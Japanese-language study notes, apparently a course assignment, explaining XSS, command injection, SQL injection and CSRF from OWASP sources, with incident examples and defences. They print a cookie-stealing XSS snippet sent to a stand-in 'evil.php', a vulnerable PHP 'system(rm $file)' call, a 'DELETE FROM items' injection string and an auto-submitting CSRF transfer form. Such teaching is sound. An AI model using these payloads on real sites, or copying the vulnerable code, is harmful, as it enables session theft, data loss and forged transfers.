# Webアプリケーションの脆弱性を理解する

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
<details>
<summary>Table of Contents</summary>

- [課題1 基本的な脆弱性を理解する](#%E8%AA%B2%E9%A1%8C1-%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B)
  - [クロスサイトスクリプティング](#%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0)
    - [どういった脆弱性なのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AA%E3%81%AE%E3%81%8B)
    - [どういった被害が発生しているのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%A2%AB%E5%AE%B3%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%8B)
    - [どのような対策を講じるべきか](#%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AA%E5%AF%BE%E7%AD%96%E3%82%92%E8%AC%9B%E3%81%98%E3%82%8B%E3%81%B9%E3%81%8D%E3%81%8B)
    - [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99)
  - [コマンドインジェクション](#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3)
    - [どういった脆弱性なのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AA%E3%81%AE%E3%81%8B-1)
    - [どういった被害が発生しているのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%A2%AB%E5%AE%B3%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%8B-1)
    - [どのような対策を講じるべきか](#%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AA%E5%AF%BE%E7%AD%96%E3%82%92%E8%AC%9B%E3%81%98%E3%82%8B%E3%81%B9%E3%81%8D%E3%81%8B-1)
    - [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99-1)
  - [SQLインジェクション](#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3)
    - [どういった脆弱性なのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AA%E3%81%AE%E3%81%8B-2)
    - [どういった被害が発生しているのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%A2%AB%E5%AE%B3%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%8B-2)
    - [どのような対策を講じるべきか](#%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AA%E5%AF%BE%E7%AD%96%E3%82%92%E8%AC%9B%E3%81%98%E3%82%8B%E3%81%B9%E3%81%8D%E3%81%8B-2)
    - [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99-2)
  - [CSRF](#csrf)
    - [どういった脆弱性なのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AA%E3%81%AE%E3%81%8B-3)
    - [どういった被害が発生しているのか](#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E8%A2%AB%E5%AE%B3%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%8B-3)
    - [どのような対策を講じるべきか](#%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AA%E5%AF%BE%E7%AD%96%E3%82%92%E8%AC%9B%E3%81%98%E3%82%8B%E3%81%B9%E3%81%8D%E3%81%8B-3)
- [課題2 クイズ](#%E8%AA%B2%E9%A1%8C2-%E3%82%AF%E3%82%A4%E3%82%BA)
- [課題3 DVWAで実演する](#%E8%AA%B2%E9%A1%8C3-dvwa%E3%81%A7%E5%AE%9F%E6%BC%94%E3%81%99%E3%82%8B)

</details>
<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## 課題1 基本的な脆弱性を理解する

OWASP は2・3年ごとに開発者に向けて、Webアプリケーションで考慮すべきセキュリティリスクのTOP10をまとめている。

以下が最新の2017年時点でのセキュリティリスクの順位である。

![](https://www.synopsys.com/content/dam/synopsys/sig-assets/images/owasp-top-10.jpg.imgw.850.x.jpg)

> 「Open Web Application Security Project Top 10（OWASP Top 10）」
> https://www.synopsys.com/ja-jp/glossary/what-is-owasp-top-10.html

### クロスサイトスクリプティング

#### どういった脆弱性なのか

**クロスサイトスクリプティング（XSS）** 攻撃は、悪意のあるスクリプトを脆弱性のあるWebサイトに注入し、クライアントのブラウザ上でコードを実行する攻撃である。

悪意のあるスクリプトをブラウザ上で実行させることで、ブラウザが保持している対象のサイトでの **Cookie、セッショントークンなどの機密情報** を盗み出し、 **ユーザになりすます** などの攻撃が実行される可能性がある。

XSS は2017年時点で、Webアプリケーションの脆弱性の中で7番目に被害が多い攻撃である。

特徴は対象のWebアプリケーションが、ユーザからの入力を検証しなかったり、エンコードせずに保存してしまい、そのままHTMLとして出力してしまうような場合にどこでも発生する点である。

XSS には主に以下の3種類が存在している。

| 名称          | 概要                                                                                                                                                                                                                                                                                       | 
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | 
| Stored XSS    | データベース、メッセージフォーラム、訪問者ログ、コメントフィールドなど、対象のサーバにユーザの入力が蓄積されている場合に発生する。<br><br>被害者は、サーバからのデータを検証することなくブラウザでレンダリングを実行すると、悪意のあるスクリプトが実行される。                             | 
| Refrected XSS | ユーザからの入力を受けて、その一部や全部を即座にエラーメッセージ、検索結果、そのほかのレスポンスに反映してしまう場合に発生する。                                                                                                                                                           | 
| DOM based XSS | 悪意のあるデータの流れがすべてブラウザ上で発生する、つまり悪意のあるデータがDOMにあり、そのDOMからほかのDOMへのデータが流れるような場合に発生する。<br><br>例えば悪意のあるデータ、DOMのHTML要素（document.location.href）から注入されたり、document.writeで書き込まれたりする場合である。 | 

---

#### どういった被害が発生しているのか

Webアプリケーションが、ユーザの入力を何も検証していない場合、攻撃者は認証されたユーザからCookie情報を盗むことが可能となる。

例えば以下のスクリプトを脆弱性のある掲示板に注入し、ユーザが対象のページのHTMLをリクエストしてしまうと、攻撃者のサイトに対してユーザが対象のサイトで保持しているCookie情報が盗まれてしまう。

```js
<script type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</script>
```

これでエスケープ処理されたCookieの中身が変数`cakemonster`に格納された状態で、`evil.php`へのリクエストが送信されてしまう。

後は攻撃者は抜き取ったCookieに格納されているセッション情報などを使用して、被害者になりすますことが可能となる。

実際に発生した被害内容と事例は以下にまとめられており、DOMにアクセスしてWebサイトを改ざんしたり、ユーザアカウントのハイジャックなどが発生している。

- [クロスサイトスクリプティングの被害内容と事例](https://securitynavi.jp/7503)

---

#### どのような対策を講じるべきか

**Stored XSS** と **Refrected XSS** に関しては、サーバ側でユーザ入力に対して適切な検証処理とエンコーディングを実装することで対処することができる。

なお入力に対する検証処理を実装する場合には、独自に実装を行うよりも使用している言語で提供されているエンコーディング用のライブラリを使用するほうが安全である。

**DOM based XSS** では、いくつかのルールに従うことで対処することが可能であるが、そのルールの詳細は [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) を要参照する。

では以下に具体的な XSS を防止するためのルールを記載する。なおルールの詳細は [XSS Prevention Rules](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules) に記載されているが、リンク先でも指摘されているように、ルール0を基本として、ルール1とルール2で十分な場合が多いため、この2つのルールを説明する。

| 名称      | 概要                                                                                                                                                                                                                                                                                         | 
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | 
| ルール#０ | 原則として検証を行っていないような信頼できないデータは、どのようなものであってもHTMLの文書に注入しないようにする。<br><br>`<script>`タグやHTMLコメント `<!-- comment -->` 、タグの名称やその属性名、CSSなどあらゆる要素で、信頼していないデータは注入してはいけない。                        | 
| ルール#1  | HTML文書に信頼していないデータを挿入する前に、必ず入力値をHTMLエンコードする。<br><br>これは例えばユーザ入力に対して、以下の文字をHTMLエンコードした後でHTML文書に挿入するという意味になる。<br><br>`& --> &amp;`<br>`< --> <`<br>`> --> >`<br>`" --> &quot;`<br>`' --> &#x27;`<br>
| ルール#2  | `<div attr=...>` のようにHTMLタグなどの属性値に値を挿入する前に、値をHTMLエンコードする。<br><br>アルファベット文字以外のすべてをASCIIに変換することで悪意のあるスクリプト実行を防ぐことができる                                                                                             | 

さらに詳細を知りたい場合は、参考資料のチートシートを参照する。

#### 参考資料

- [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
- [Cross Site Scripting Prevention Cheat Sheet¶](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

### コマンドインジェクション

#### どういった脆弱性なのか

**コマンドインジェクション** とは、脆弱性のあるWebアプリケーションに対して、入力Formなどを利用してホストOSの任意のコマンドを実行する攻撃である。

この攻撃は、ユーザの入力する値をシステムのシェルに渡すことで可能となる。

例えば以下のようなPHPコードでは、ユーザが入力したファイル名をそのまま `rm` コマンドの引数に渡しているが、Linuxでの パイプ（`|`）などを使って自由に他のOSコマンドを実行することができる。


```php
<?php

print(“Please specify the name of the file to delete”);
print(“<p>”); 

$file=$_GET[‘filename’];
system(“rm $file”); 

?>
```

---

#### どういった被害が発生しているのか

実際に大量の個人情報が盗まれてしまう被害が発生している。

- [日テレで43万件の個人情報流出--攻撃に使われた「OSコマンドインジェクション」とは？](https://japan.cnet.com/article/35081677/)
- [J-WAVE、コマンドインジェクション攻撃による不正アクセス、個人情報64万件が流出した恐れ](https://internet.watch.impress.co.jp/docs/news/754885.html)

---

#### どのような対策を講じるべきか

基本的にはユーザが入力した値に対して正しい検証処理を実行すれば問題ない。

また実装したい機能を実現するために、OSコマンドではなく使用している言語で提供されているAPIを極力使用するようにする。

例えば Java では、メール送信時に `Runtime.exec()` で実装するよりも、`javax.mail.*` で提供されているライブラリを使用するほうが安全である。

#### 参考資料

- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)

---

### SQLインジェクション

#### どういった脆弱性なのか

**SQLインジェクション** とは、脆弱性のあるWebアプリケーションへの入力データを介して、SQLクエリを注入することで、データベースから機密情報を抽出したり、データの中身の変更したり、データベース管理操作の実行したりする攻撃である。

信頼されていないソースからプログラムに対して入力データをそのまま注入したり、SQLクエリを動的に構築する際によく発生する。

主に以下のような被害が発生しうる。

- 機密性の漏洩
  - データベースには機密情報が満載である
  - SQLインジェクションで盗まれると被害が大きい
- 認証
  - 十分な対策が施されていないSQLクエリを使ってユーザ名とパスワードを検証する
  - SQLインジェクションにより、パスワードを知らなくても他のユーザとしてシステムにアクセスされてしまう
- 認可
  - 認可情報がデータベースに格納されている場合、SQLインジェクションでこの情報を改変されてしまう可能性がある
- 完全性
  - SQLインジェクションにより、情報を改変したり削除されてしまう可能性がある

具体的にどのように攻撃が行われるのか考えるために、以下の `C#` のコードを例に攻撃例を考える。

```c#
string userName = ctx.getAuthenticatedUserName();
string query = "SELECT * FROM items WHERE owner = "'"
                + userName + "' AND itemname = '"
                + ItemName.Text + "'";
sda = new SqlDataAdapter(query, conn);
DataTable dt = new DataTable();
sda.Fill(dt);
```

上記のように入力値をそのままSQLクエリに挿入するような場合、SQL文を途中で終了させるような入力値を選択することで、データベースに対して攻撃を仕掛けることができる。

例えば以下の入力を行う。

```c#
userName = hacker
ItemName = "name'); DELETE FROM items; --"
```

こうすると最終的に実行されるSQLクエリは以下の形式になる。

```sql
SELECT * FROM items
WHERE owner = 'hacker'
AND itemname = 'name';

DELETE FROM items;

--'
```

これで攻撃者は `items` テーブルを削除することが可能となる。

---

#### どういった被害が発生しているのか

SQLインジェクションによって様々な被害が発生している。

以下がその具体例である。

- PlayStation Network
  - ソニーグループに対する標的型攻撃と考えられている
  - 漏えいした情報は、氏名、住所、Eメールアドレス、生年月日、パスワード、オンラインID、購入履歴、請求先住所、パスワード再設定用のデータ、サブアカウントなど、多岐にわたる
- シャトレーゼ
  - SQLインジェクションにより、ユーザーIDと暗号化しているパスワード、メールアドレス、電話番号、誕生日を含む、20万9999件分の情報が流出した
  - シャトレーゼはWebサイトを停止する自体となった
- Ubuntuのフォーラムサイト
  - フォーラムサイトが悪用され、200万人の情報が流出した
  - フォーラムのデータベースサーバに特定のSQLを挿入されてしまい、全てのテーブルが読み込まれるという状況であった。

---

#### どのような対策を講じるべきか

SQLインジェクションは、開発者がユーザからの入力を使用して動的なSQLクエリを構築した際に発生する。開発者は攻撃を回避するために、主に以下の2つの対策を行えばいい。

1. 動的なクエリの書き込みをやめる
2. ユーザから入力された値がSQLのロジックを変えないようにする

では実際に上記の2つを実践するためのテクニックを紹介していく。

---

1つ目は、**Prepared Statements** の利用である。

これは特定のプログラミング言語が提供しているAPIに従って、ユーザの入力値をSQLクエリに反映する方法である。

開発者は最初にSQLクエリの構造を決定した後で、入力値をパラメータとして渡すため、SQLインジェクションにより、SQLクエリ自体の構造が変化することがない。

例えば `Java` の場合は以下のようにSQLクエリに対してパラメータを挿入する。

```java
// This should REALLY be validated too
String custname = request.getParameter("customerName");
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname);
ResultSet results = pstmt.executeQuery( );
```

上記のコード中の `custname` には `'1'='1` などの入力が渡されても、そのまま全体を文字列として挿入し、挿入した文字列にマッチするユーザ名を検索することになる。

---

2つ目は、**ストアドプロシージャ** を使用する。

ストアドプロシージャは常にSQLインジェクションを防ぐことができるとは限らない。

しかし、ほとんどのストアドプロシージャで標準的に提供されているパラメータ化クエリを、安全に実装すればSQLインジェクションを防ぐことができる。

Prepared Statements との違いは、ストアドプロシージャは定義されたSQLコード自体がデータベースに格納されて、アプリケーションから呼び出される形で使用することである。

例えば `Java` では、以下のようにストアドプロシージャを使用する。

```java
// This should REALLY be validated
String custname = request.getParameter("customerName");
try {
  CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
  cs.setString(1, custname);
  ResultSet results = cs.executeQuery();
  // … result set handling
} catch (SQLException se) {
  // … logging and error handling
}
```

---

3つ目は、ホワイトリスト形式で **ユーザの入力を検証** する方法である。

これはユーザからの入力値をそのまま動的にSQLクエリに挿入するのではなく、例えば入力値をホワイトリストで許可されている内容なのか検証したりと、何かしらも検証処理を行った後でSQLクエリに挿入する方法である。

例えばテーブル名に関しては、以下のように事前に定義されたものだけを動的SQLクエリに挿入するようにしている。

```java
String tableName;
switch(PARAM):
  case "Value1": tableName = "fooTable";
                 break;
  case "Value2": tableName = "barTable";
                 break;
  ...
  default      : throw new InputValidationException("unexpected value provided"
                                                  + " for table name");
```


---

4つ目は、ユーザからの入力をエスケープ処理するようにする。

これはあくまでも上記の3つの対策がどれも実行できない場合に使用するものである。

各DBMS]は特定の種類のクエリに固有の1つ以上の文字エスケープをサポートしており、適切なエスケープを実行すればDBMSはSQLコード自体とパラメータを混同しないため、SQLインジェクションを防ぐことができる。

#### 参考資料

- [[OWASP] SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [[OWASP] SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [[OWASP] Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
- [被害は7700万人分の個人情報。悪名高き攻撃「SQLインジェクション」への対策方法とは？](https://style.potepan.com/articles/11125.html)
- [SQLインジェクションとは？被害事例と対策方法5つ！](https://wpmake.jp/contents/security/sql-injection/#SQL-3)

---

### CSRF

#### どういった脆弱性なのか

**クロスサイトリクエストフォージェリ（CSRF）** は、脆弱性のWebアプリケーションに対して認証済みのエンドユーザをだまして、サーバ上でユーザが意図していない操作を実行するためのリクエストを送信する攻撃である。

通常のユーザであればお金の送金やパスワードの変更などを実行させることができ、管理者カウントに対して攻撃が成功してしまうと、Webアプリケーション全体を危険にさらす
可能性がある。

以下にいくつか具体的な攻撃手法を解説していく。

なお基本的な考え方は、まず攻撃者は悪意のあるURLやスクリプトを構築し、被害者に対して社内メールを偽装するなどして、ソーシャルエンジニアリング攻撃を仕掛けて悪意のある攻撃を実行させるというものである。

--- 

**GET** リクエストを使用する攻撃パターンを考える。

例えば銀行の送金を行う操作が、GET リクエストのパラメータを指定してする形式で設計されている場合を考える。

以下は `BOB` というユーザが100という量の金額を支払うというものである。

```
GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1
```

攻撃者はまず以下のような悪意のあるURLを構築する。

```
GET http://bank.com/transfer.do?acct=Evil&amount=100000 HTTP/1.1
```

あとはソーシャルエンジニアリング攻撃を使用して、被害者にこのURLを踏ませてしまえばいい。

こうすることで攻撃者は、不審なメールのリンクや、`<a>` タグや `<img>` タグなどのリンク先に設定することで、情報セキュリティに疎いユーザを標的に意図しない操作を実現することが可能となってしまう。

---

**POST** リクエストを使用する攻撃パターンを考える。

GET リクエストの場合との違いは被害者が意図しない操作をしてしまう際の流れである。

では今度は以下のような POST リクエストを使用して銀行のアカウントに送金を行う場合を考えてみる。

```
POST http://bank.com/transfer.do HTTP/1.1

acct=BOB&amount=100
```

攻撃者は今度は `<form>` タグなどを使用して攻撃に必要な情報を被害者が入力するように誘導する。

```
<form action="http://bank.com/transfer.do" method="POST">

<input type="hidden" name="acct" value="MARIA"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>

</form>
```

あとは被害者がこのフォームのボタンをクリックするか、あるいは以下のように自動的に送信してしまえば、ユーザが意図しない操作をサーバ上で実現できてしまう。

```js
<body onload="document.forms[0].submit()">

<form...
```

---

#### どういった被害が発生しているのか

CSRF では情報漏洩やSNSの乗っ取り、自身のお金で買い物を勝手にされてしまうなど、多くの被害が考えられる。

以下が実際に発生した被害事例である。

- 「ぼくはまちちゃん」騒動
  - 発生時期は2005年4月中旬
  - 被害サイトはSNSサイトの1つである mixi
  - 投稿者が意図しないまま、「ぼくはまちちゃん！ こんにちはこんにちは!!」という定型文が書き込まれる事例が発生した
  - この投稿には他のユーザを同様の罠におびき寄せる細工があったため、同じメッセージが mixi に溢れかえることとなってしまった。
- 横浜市小学校襲撃予告事件
  - 発生時期は2012年初夏から秋にかけて
  - 横浜市のウェブサイトの意見投稿コーナーに、特定の小学校への無差別殺人予告が投稿される
  - 攻撃者はCSRFを用いて、無関係の人物から意図しない投稿を実行させていた
  - 被害者は神奈川県警により逮捕・起訴され保護観察処分の扱いとなってしまった
  - そのあと、神奈川県警は誤認逮捕を認めて謝罪した

---

#### どのような対策を講じるべきか

まずは簡単にCSRFに対する防護策を簡易的にまとめる。

- Webアプリケーションフレームワークを使用している場合は、CSRFに対する防護機能が組み込まれていないのか確かめる
  - 組み込まれていない場合は **CSRFトークン** の使用を考慮する
- セッションCookieを使用する場合は必ず `SameSite` 属性を使用する
- 以下の中から最低1つの緩和策を採用する
  - カスタムリクエストヘッダの使用
  - Originの検証
  - Cookieの2回送信
- ユーザの操作を強制する仕組みを導入する
  - Re-Authentication
  - One-Time Token
  - CAPTCHA
- XSSに対する防護策も実行する
- GETリクエストで状態変化が発生するようなAPI設計をしない

今回はCSRF対策として有名なトークンを使用した防護策を紹介する。

---

CSRFトークンは、サーバ側がユーザセッションやリクエストごとに生成するものである。

リクエストごとにトークンを発行するほうがより安全ではあるが、ユーザビリティが低下してしまう可能性がある。例えばあるページから前のページに「戻る」場合、遷移先の前のページではすでにトークンの有効期限は切れてしまっているため、サーバ側は本来ならユーザを認証されていないユーザ、つまり偽陽性の判定を行ってしまう可能性がある。

CSRFトークンは、以下のような性質を持っているべきである。

- ユーザごとに一意であること
- 機密な状態であること
- 予測できない値であること

注意点としてはCSRFトークンはCookieとして持たせてはダメで、必ずHTML内の隠しフィールド値やHTTPヘッダとして、フォーム送信やAJAXリクエストの際に付与する点である。

例えば以下のようなフォームであり、Twitterのログインフォームにも `authenticity_token` という名称で各フィールド値として保存されている。

```html
<form action="/transfer.do" method="post">
<input type="hidden" name="CSRFToken" value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">
[...]
</form>
```

#### 参考資料

- [[OWASP] Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [[OWASP] Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [ソーシャルエンジニアリング攻撃とは？](https://www.cloudflare.com/ja-jp/learning/security/threats/social-engineering-attack/)
- [[Wikipedia] クロスサイトリクエストフォージェリ](https://ja.wikipedia.org/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA#%E6%A8%AA%E6%B5%9C%E5%B8%82%E5%B0%8F%E5%AD%A6%E6%A0%A1%E8%A5%B2%E6%92%83%E4%BA%88%E5%91%8A%E4%BA%8B%E4%BB%B6)

## 課題2 クイズ



## 課題3 DVWAで実演する

- [DVWA](./DVWA) にて [Damn Volnerable Web Application](https://dvwa.co.uk/) を使用した実演を行っている。